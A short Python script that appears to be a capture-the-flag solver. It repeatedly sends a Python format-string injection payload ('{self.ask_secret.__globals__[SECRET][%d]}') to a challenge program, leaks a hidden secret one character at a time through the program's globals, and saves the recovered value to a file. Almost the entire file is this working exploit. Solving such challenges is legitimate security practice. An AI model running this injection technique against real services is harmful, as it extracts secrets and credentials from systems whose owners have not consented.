#!/usr/bin/python3
answer=""
password=""

with open("res", "w") as out:

    while not "You found the secret" in answer:
        print(0)
        # print("HACK_EVERYTHING") # TODO: find how to hack everything
        print("{self.ask_secret.__globals__[SECRET][%d]}>9" % len(password))
        input()
        input()
        password += input()[10]
        print(password)
        answer = input()

    out.write(answer)
    out.write(password)
    out.close()
